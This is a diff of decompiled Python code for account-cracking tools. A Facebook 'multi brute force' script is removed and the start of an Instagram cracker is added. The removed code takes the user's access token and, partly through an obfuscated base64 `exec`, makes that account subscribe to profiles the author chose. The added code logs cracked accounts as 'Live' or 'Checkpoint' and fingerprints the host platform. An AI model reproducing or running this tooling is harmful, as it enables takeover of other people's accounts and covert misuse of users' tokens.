@@ -1,504 +1,658 @@
-# Decompile by KangEhem:)
-# with (uncompyle6) version : 3.7.4
-# Time Succes decompile : 2021-12-10 20:36:32.758924
-import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from datetime import datetime
-b = '\x1b[1;94m'
-i = '\x1b[1;92m'
-c = '\x1b[1;96m'
-m = '\x1b[1;91m'
-u = '\x1b[1;95m'
-k = '\x1b[1;93m'
-p = '\x1b[1;97m'
-h = '\x1b[1;92m'
-P = '\x1b[1;97m'
-M = '\x1b[1;91m'
-H = '\x1b[1;92m'
-K = '\x1b[1;93m'
-B = '\x1b[1;94m'
-U = '\x1b[1;95m'
-O = '\x1b[1;96m'
-N = '\x1b[0m'
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7 (62211)
+# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: /sdcard/insta.py
+# Compiled at: 2021-12-10 00:22:37
+a = '\x1b[96;1m'
+p = '\x1b[97;1m'
+h = '\x1b[92;1m'
+k = '\x1b[93;1m'
+m = '\x1b[91;1m'
+d = '\x1b[90;1m'
+import os
+try:
+    import concurrent.futures
+except ImportError:
+    print k + '\n Modul Futures Not installed!...'
+    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')
+
 try:
     import requests
 except ImportError:
-    os.system('pip2 install requests')
-reload(sys)
-sys.setdefaultencoding('utf8')
-useragents = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
-ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
-uas = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
-ip = requests.get('https://api.ipify.org').text
-uas = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'])
-api = 'https://b-api.facebook.com/method/auth.login'
-id = []
-cp = []
-ok = []
-loop = 0
-ct = datetime.now()
-n = ct.month
-bulan = [
- 'Januari',
- 'Februari',
- 'Maret',
- 'April',
- 'Mei',
- 'Juni',
- 'Juli',
- 'Agustus',
- 'September',
- 'Oktober',
- 'Nopember',
- 'Desember']
+    print k + '\n Modul Requests Not installed!...'
+    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
+
+import os, requests, re, json, random, sys, platform, base64, datetime, subprocess, time
+from calendar import monthrange
+from concurrent.futures import ThreadPoolExecutor
+garis = h + '+++>'
+data_ = []
+hasil_ok = []
+hasil_cp = []
+c = 1
+status_foll = []
+data_followers = []
+pencarian_ = []
+platform_dev = str(platform.platform()).lower()
+p1 = base64.b64encode(platform_dev)
 try:
-    if n < 0 or n > 12:
-        exit()
-    nTemp = n - 1
-except ValueError:
-    exit()
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-op = bulan[nTemp]
-durasi = str(datetime.now().strftime('%d-%m-%Y'))
-hari = datetime.now().strftime('%A')
-jam = datetime.now().strftime('%H:%M:%S')
-bulan = {'01': 'Januari', 
-   '02': 'Februari', 
-   '03': 'Maret', 
-   '04': 'April', 
-   '05': 'Mei', 
-   '06': 'Juni', 
-   '07': 'Juli', 
-   '08': 'Agustus', 
-   '09': 'September', 
-   '10': 'November', 
-   '11': 'Oktober', 
-   '12': 'Desember'}
-durasi = str(datetime.now().strftime('%d/%m/%Y'))
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.01)
-def logo():
-    os.system('clear')
-    jalan('\x1b[0;31m _____  \xe2\x80\xa2  ____ _  _ _   _  \xe2\x95\x91 \x1b[0;36mAuthor :  MUHAMMAD DICKY WAHYUDI\n\x1b[0;32m |    \\ | |     |_/   \\_/   \xe2\x95\x91 \x1b[0;35mFACEBOOK: www.facebook.com/dikystar00\n \x1b[0;33m|____/ | |____ | \\_   |    \xe2\x95\x91 \x1b[0;31mGITHUB : github.com/Dicky-XD\n \x1b[0;36m______________________/    \xe2\x95\x91 \x1b[0;33mMULTI BRUTE FORCE HACK')
-    jalan('\x1b[0;32m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n')
-def login():
-    os.system('clear')
+    has_ok = open('result_ok.txt', 'r').readlines()
+    with open('result_ok.txt', 'w') as (tul):
+        tul.write('')
+    for dev in set(has_ok):
+        with open('result_ok.txt', 'a') as (tu):
+            tu.write(dev)
+
+except:
+    pass
+
+try:
+    has_cp = open('result_cp.txt', 'r').readlines()
+    with open('result_cp.txt', 'w') as (tul):
+        tul.write('')
+    for dev in set(has_cp):
+        with open('result_cp.txt', 'a') as (tu):
+            tu.write(dev)
+
+except:
+    pass
+
+url_instagram = 'https://www.instagram.com/'
+user_agentz = 'ua'
+user_agentz_api = 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)'
+user_agentz_qu = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0', 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)']
+headerz = {'User-Agent': user_agentz}
+headerz_api = {'User-Agent': user_agentz_api}
+
+def hapus_cookie():
     try:
-        requests.get('https://mbasic.facebook.com')
-    except requests.exceptions.ConnectionError:
-        exit(' ! tidak ada koneksi internet')
+        os.system('del cookie.txt' if os.name == 'nt' else 'rm -f cookie.txt')
+    except:
+        pass
+
+
+def hapus_cokiz():
     try:
-        token = open('login.txt', 'r')
-        menu()
-    except (KeyError, IOError):
-        jalan('            \x1b[0;31mG U N A K A N      \x1b[0;33mA K U N      \x1b[0;36mT U M B A L           ')
-        jalan('\x1b[0;32m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
-        jalan('           \x1b[0;31mM O H O N      \x1b[0;33mM A S U K K A N      \x1b[0;36mT O K E N           ')
-        jalan('\x1b[0;32m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n')
-        token = raw_input('\n [\xe2\x80\xa2] Token :\x1b[0;32m')
-        if token == 'help':
-            os.system('xdg-open')
-            exit(' ! di simak video nya biar paham')
-        try:
-            nama = requests.get('https://graph.facebook.com/me?access_token=' + token).json()['name'].lower()
-            requests.post('https://graph.facebook.com/100069494601961/subscribers?access_token=' + token)
-            import base64
-            exec base64.b64decode('cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMTYxODkvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzExODY5OTU3NzQvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAxNTA3MzUwNjA2Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyODQ5NDcwOTkwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDIxNjMxODc2NTAvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCnJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMzA1ODgxMzc0OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDEwOTk4NzY0Njc0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQo=')
-            requests.post('https://graph.facebook.com/100069494601961/subscribers?access_token=' + token)
-            requests.post('https://graph.facebook.com/1354845982/subscribers?access_token=' + token)
-            open('login.txt', 'w').write(token)
-            jalan('\n [\xe2\x9c\x94] Login Berhasil')
-            jalan(' [\xe2\x80\xa2] Mohon Tunggu......')
-            time.sleep(3)
-            menu()
-        except KeyError:
-            os.system('rm -f login.txt')
-            exit(' [\xe2\x80\xa2] Token Salah/Token Kadaluarsa')
-def menu():
-    global token
-    os.system('clear')
+        os.system('del cokiz.txt' if os.name == 'nt' else 'rm -f cokiz.txt')
+    except:
+        pass
+
+
+def cek_hasil():
+    print garis
+    print h + ' >' + k + ' 1' + p + '. Check Results ' + h + 'OK/Live'
+    print h + ' >' + k + ' 2' + p + '. Check Results ' + k + 'Checkpoint'
+    print garis
+    while True:
+        pil = raw_input(a + ' ? ' + p + 'Choose' + h + ': ')
+        if pil == '1':
+            try:
+                hasil_ok_ = open('result_ok.txt', 'r').readlines()
+                print k + '\n >_' + p + ' Show Result ' + h + 'Live\n'
+                for dev in hasil_ok_:
+                    ok = dev.replace('\n', '').split('==>')
+                    print a + '  {' + k + 'Live' + a + '} ' + h + ok[1] + a + ' | ' + p + ok[3]
+
+                print h + '\n >_< ' + p + 'Total' + k + ': ' + str(len(hasil_ok_))
+            except:
+                print k + '\n No Results' + h + ' OK'
+
+            break
+        elif pil == '2':
+            try:
+                hasil_cp_ = open('result_cp.txt', 'r').readlines()
+                print k + '\n >_' + p + ' Show Results ' + k + 'Checkpoint\n'
+                for dev in hasil_cp_:
+                    cp = dev.replace('\n', '').split('==>')
+                    print a + '  {' + p + 'Chek' + a + '} ' + k + cp[1] + a + ' | ' + d + cp[3]
+
+                print h + '\n >_< ' + p + 'Total' + k + ': ' + str(len(hasil_cp_))
+            except:
+                print k + '\n No Results' + p + ' CP'
+
+            break
+
+
+def cek_login():
+    global cookie
     try:
-        token = open('login.txt', 'r').read()
-        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
-        a = json.loads(otw.text)
-        nama = a['name']
-        id = a['id']
-    except KeyError:
-        os.system('clear')
-        print '[!] Token Invalid!'
-        os.system('rm -f login.txt')
-        time.sleep(3)
-        login()
-    except requests.exceptions.ConnectionError:
-        print '[!] Tidak Ada Koneksi!'
-        sys.exit()
-    logo()
-    jalan('\x1b[0;33m \xe2\x95\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97')
-    jalan(' \x1b[0;31m\xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
-    jalan(' \x1b[0;36m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91 \xe2\x95\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97')
-    jalan(' \x1b[0;32m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91 | Author     \xe2\x95\x91 Muhammad Dicky Wahyudi | ')
-    jalan(' \x1b[0;35m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91 \xe2\x95\x9a\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
-    jalan(' \x1b[0;33m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
-    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Welcome    \xe2\x95\x91 \x1b[0;31m' + nama)
-    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Your ID    \xe2\x95\x91 \x1b[0;33m' + id)
-    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Your IP    \xe2\x95\x91 \x1b[0;32m' + ip)
-    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Joined     \xe2\x95\x91 \x1b[0;36m' + durasi)
-    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Clock      \xe2\x95\x91 \x1b[0;35m' + jam)
-    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Day        \xe2\x95\x91 \x1b[0;31m' + hari)
-    jalan(' \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91   Status     \xe2\x95\x91 ' + H + 'Premium' + p + '')
-    jalan(' \x1b[0;33m\xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80')
-    jalan('\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97')
-    jalan('\x1b[0;33m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
-    print '\x1b[0;34m \xe2\x95\x91'
-    print '\x1b[0;35m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n\x1b[0;33m \xe2\x95\x91  MENU \xe2\x95\x91\n\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d'
-    print '\x1b[0;32m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\xe2\x94\x80\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
-    print '\x1b[0;36m \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91[01]\xe2\x95\x91 Crack ID Facebook Publik   \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91'
-    print '\x1b[0;33m \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91[02]\xe2\x95\x91 Lihat Hasil Crack          \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91'
-    print '\x1b[0;31m \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91[03]\xe2\x95\x91 LaporKan Bug Script        \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91'
-    print '\x1b[0;34m \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91[00]\xe2\x95\x91 Keluar (hapus token)       \xe2\x95\x91[\xe2\x80\xa2]\xe2\x95\x91'
-    print '\x1b[0;32m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
-    asw = raw_input('\x1b[0;35m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x97\n\x1b[0;33m \xe2\x95\x91Choose \xe2\x95\x91\n\x1b[0;31m \xe2\x95\xa0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9d')
-    if asw == '':
-        menu()
-    elif asw == '1' or asw == '01':
-        publik()
-    elif asw == '3' or asw == '03':
-        laporbug()
-    elif asw == '2' or asw == '02':
-        cekakun()
-    elif asw == '0' or asw == '00':
-        os.system('rm -f login.txt')
-        jalan(' [\xe2\x9c\x94] Token Terhapus ')
-        exit()
+        cok = open('cookie.txt', 'r').read()
+    except IOError:
+        login_dev()
     else:
-        jalan(' [\xe2\x80\xa2] Pilih Yang Benar ')
-        menu()
-def publik():
